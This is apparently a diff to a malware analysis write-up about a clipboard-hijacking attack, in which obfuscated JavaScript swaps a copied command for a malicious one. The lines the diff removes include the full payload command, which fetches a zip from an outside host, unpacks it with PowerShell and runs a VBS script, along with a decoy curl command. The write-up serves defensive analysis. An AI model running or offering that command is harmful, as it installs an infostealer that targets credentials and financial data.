@@ -171,20 +171,6 @@ S.useEffect(() => {
 4. **Clipboard Replacement**: `u.clipboardData.setData("text/plain", d)` replaces the clipboard content with the malicious command
 5. **Prevention**: `u.preventDefault()` prevents the original legitimate text from being copied
 
-**The Deception:**
-
-- User sees:
-```
-curl -L "https://download.microsoft.com/download/graphics-driver-update.exe" -o driver-update.exe && driver-update.exe /silent
-```
-
-- User copies the command (appears legitimate)
-- JavaScript secretly replaces clipboard with:
-```
-curl -k -o "%TEMP%\fixed.zip" "https://auto-ai.online/cam-v-257.fix" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"
-```
-- User pastes and executes the malicious payload unknowingly
-
 **Obfuscation Techniques:**
 
 The code is heavily obfuscated with lots of redundancies and nonsensical variable names. All whitespaces are also removed so the code is compressed into a single line. Right-click and opening of console via keyboard shortcuts is also disabled. The malicious code is mixed with genuine React applicable code to make it harder to detect.
@@ -205,14 +191,13 @@ I loaded a VM and downloaded the payload. A screenshot of the zip file's content
 
 **What the VBS script does:**
 
-1. Extracts `dll.zip` using `tar -xf` command
+1. Extracts `dll.zip`
 2. Executes `chost.exe audiodriver.py` (runs in background)
 3. **Obfuscation:** Uses string concatenation to hide commands (`"ch" & "ost.exe"`)
 4. **Stealth:** Runs commands with hidden windows
 
-I looked at the python code, and they're putting in registry entries to start the binaries at startup, so this attack will be scanning the system continuously for anything of value.
-
-There's a couple compiled binaries in there which is safe to assume are likely looking for anything to get their hands one, e.g. API keys, seed phrases, banking information, etc.
+I looked at the python code, and they're putting in registry entries to start the binaries at startup, so this
+attack will be scanning the system continuously for anything of value. e.g. API keys, seed phrases, banking information, etc.
 
 #### Mac Payload
 
